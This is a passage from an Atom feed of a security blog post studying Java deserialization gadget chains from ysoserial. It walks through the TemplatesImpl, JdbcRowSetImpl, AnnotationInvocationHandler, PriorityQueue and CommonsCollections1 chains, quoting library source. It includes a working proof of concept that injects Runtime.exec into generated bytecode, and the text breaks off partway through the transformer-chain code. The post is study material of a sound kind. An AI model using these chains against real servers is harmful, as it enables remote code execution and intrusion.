<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Padishah&#39;s blog</title>
  
  <subtitle>Padishah</subtitle>
  <link href="http://padishah.github.io/atom.xml" rel="self"/>
  
  <link href="http://padishah.github.io/"/>
  <updated>2023-10-24T04:49:26.015Z</updated>
  <id>http://padishah.github.io/</id>
  
  <author>
    <name>Padishah</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java Deserialize Vulnerabilities, ysoserial study</title>
    <link href="http://padishah.github.io/2023/10/24/Pentest/Java%20Deserialize%20Vulnerabilities%20ysoserial%20study/"/>
    <id>http://padishah.github.io/2023/10/24/Pentest/Java%20Deserialize%20Vulnerabilities%20ysoserial%20study/</id>
    <published>2023-10-23T16:00:00.000Z</published>
    <updated>2023-10-24T04:49:26.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sinks"><a href="#Sinks" class="headerlink" title="Sinks"></a>Sinks</h1><h2 id="TemplatesImpl-exploit"><a href="#TemplatesImpl-exploit" class="headerlink" title="TemplatesImpl exploit"></a>TemplatesImpl exploit</h2><blockquote><p>[!NOTE] Pre-requirements<br>Codes in this section are written with JDK7u21</p></blockquote><p><code>TemplatesImpl</code> provides a public approach to defining and instantiating classes from byte code.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;  </span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;  </span><br><span class="line">        <span class="built_in">super</span>(parent);  </span><br><span class="line">    &#125;  </span><br><span class="line">   Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Backtracking, in <code>defineTransletClasses</code> method calls <code>TransletClassLoader.defineClass()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span>  </span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)  </span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;  </span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;  </span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;  </span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;  </span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// Check if this is the main class  </span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;  </span><br><span class="line">                _transletIndex = i;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123;  </span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;  </span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;  </span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is a constraint that the superclass of the newly defined should be consistent with <code>AbstractTranslet</code>.</p><p>Backtracking, in <code>getTransletInstance</code> method, call <code>defineTransletClasses()</code> and instantiate the newly defined class:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span>  </span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();  </span><br><span class="line"></span><br><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)_class[_transletIndex].newInstance();  </span><br><span class="line">        translet.postInitialization();  </span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);  </span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);  </span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;  </span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> translet;  </span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <code>newTransformer</code> method calls <code>getTransletInstance()</code> and it’s public so we can find its reference for further exploitation:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span>  </span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    TransformerImpl transformer;  </span><br><span class="line">  </span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,  </span><br><span class="line">        _indentNumber, _tfactory);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;  </span><br><span class="line">        transformer.setURIResolver(_uriResolver);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;  </span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> transformer;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">templatesImplCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line"><span class="type">Class</span> <span class="variable">abstractTransletCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  </span><br><span class="line"><span class="type">Class</span> <span class="variable">factoryCls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Gadgets.StubTransletPayload.class));  </span><br><span class="line">  </span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Gadgets.StubTransletPayload.class.getName());  </span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;  </span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);  </span><br><span class="line">  </span><br><span class="line"><span class="type">CtClass</span> <span class="variable">abstractTransletCtCls</span> <span class="operator">=</span> classPool.get(abstractTransletCls.getName());  </span><br><span class="line">clazz.setSuperclass(abstractTransletCtCls);  </span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;payload&quot;</span> + System.nanoTime();  </span><br><span class="line">clazz.setName(className);  </span><br><span class="line">  </span><br><span class="line"><span class="type">byte</span>[] bytecode = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> templatesImplCls.newInstance();  </span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode, ClassFiles.classAsBytes(Gadgets.Foo.class)&#125;);  </span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;xxx&quot;</span>);  </span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, factoryCls.newInstance());  </span><br><span class="line">  </span><br><span class="line">((TemplatesImpl) templates).newTransformer();</span><br></pre></td></tr></table></figure><h2 id="JdbcRowSetImpl-exploit"><a href="#JdbcRowSetImpl-exploit" class="headerlink" title="JdbcRowSetImpl exploit"></a>JdbcRowSetImpl exploit</h2><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on JDK1.8</p></blockquote><p>The method <code>connect()</code> of <code>JdbcRowSetImpl</code> can look up the JNDI URL stored in <code>databaseMetaData</code> property.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"><span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> conn;  </span><br><span class="line">  </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;  </span><br><span class="line">   ...</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup  </span><br><span class="line">(getDataSourceName());</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Kick-offs"><a href="#Kick-offs" class="headerlink" title="Kick-offs"></a>Kick-offs</h1><h2 id="AnnotationInvocationHandler-exploit"><a href="#AnnotationInvocationHandler-exploit" class="headerlink" title="AnnotationInvocationHandler exploit"></a>AnnotationInvocationHandler exploit</h2><p>This class serves as a deserialization enter point.<br>In its deserialization process, <code>entrySet()</code> and <code>getValue()</code> method will be called on its <code>memberValues</code> member. The <code>entrySet()</code> can take effect associated with proxy([[Java Deserialize Vulnerabilities ysoserial study#Using TemplatesImpl (CB1 CB2)|example]]). The <code>getValue()</code> is widely used in CommonsCollections chain.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">    <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists  </span></span><br><span class="line">        value = memberValue.getValue();  </span><br><span class="line">        <span class="keyword">if</span> (!(memberType.isInstance(value) ||  </span><br><span class="line">              value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;  </span><br><span class="line">            value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">                        objectToString(value))  </span><br><span class="line">                .setMember(annotationType.members().get(name));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="PriorityQueue-exploit"><a href="#PriorityQueue-exploit" class="headerlink" title="PriorityQueue exploit"></a>PriorityQueue exploit</h2><p>The <code>PriorityQueue</code> class is a deserialization enter point.<br>Combine it with a certain comparator(e.g. [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|TransformingComparator in CC2]], [[Java Deserialize Vulnerabilities ysoserial study#CommonsBeanutils|BeanComparator in CB1]]), the <code>compare()</code> method would be triggered in the deserialization process. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ...</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)  </span><br><span class="line">        siftDown(i, (E) queue[i]);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  </span><br><span class="line">        siftDownUsingComparator(k, x);  </span><br><span class="line">    <span class="keyword">else</span>        siftDownComparable(k, x);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;  </span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;  </span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)  </span><br><span class="line">            c = queue[child = right];  </span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        ...</span><br><span class="line">    &#125;  </span><br><span class="line">    ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Chains"><a href="#Chains" class="headerlink" title="Chains"></a>Chains</h1><h2 id="CommonCollections"><a href="#CommonCollections" class="headerlink" title="CommonCollections"></a>CommonCollections</h2><h3 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h3><blockquote><p>[!NOTE] Pre-requirements<br>JDK &lt; 1.8 (Tested on JDK7u21, fail on JDK1.8)<br>commons-collections:commons-collections:3.1</p></blockquote><blockquote><p>[!NOTE]<br>There are main two variants of CC1, <code>LazyMap</code> or <code>TransformedMap</code></p></blockquote><h4 id="Using-LazyMap"><a href="#Using-LazyMap" class="headerlink" title="Using LazyMap"></a>Using <code>LazyMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>Use <code>AnnotationInvocationHandler</code> object(handler1) to trigger deserialize method <code>readObject</code>, it contains a dynamic proxy object for <code>Map</code> interface, another <code>AnnotationInvocationHandler</code> object(handler2) is contained in this <code>Proxy</code> object, handler2 contains a <code>LazyMap</code> armed with the evil transformer chain.<br>![[Pasted image 20231008190210.png|700]]</p><p>Firstly, when a deserialize procession is started, in handler1’s <code>readObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">    <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists  </span></span><br><span class="line">        value = memberValue.getValue();  </span><br><span class="line">        <span class="keyword">if</span> (!(memberType.isInstance(value) ||  </span><br><span class="line">              value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;  </span><br><span class="line">            value = <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(  </span><br><span class="line">                        objectToString(value))  </span><br><span class="line">                .setMember(annotationType.members().get(name));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Obtain <code>memberValues</code>(which is a <code>Proxy</code>) and call <code>entrySet()</code> on it. The proxy will employ its <code>InvocationHandler</code> member to trigger <code>invoke()</code> method with <em>entrySet</em> method as one of parameters. In handler2’s <code>invoke()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  </span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">null</span>)  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As for handler2, <code>memberValues</code> is a <code>LazyMap</code> object with evil transformer chain, when its <code>get</code> is called, since there is no key like <em>entrySet</em> in this empty map, the transformer chain will be triggered as code below presents:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyMap.java</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The evil transformer chain is usually presented as:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);  </span><br><span class="line"><span class="comment">// real chain for after setup  </span></span><br><span class="line"><span class="keyword">final</span> 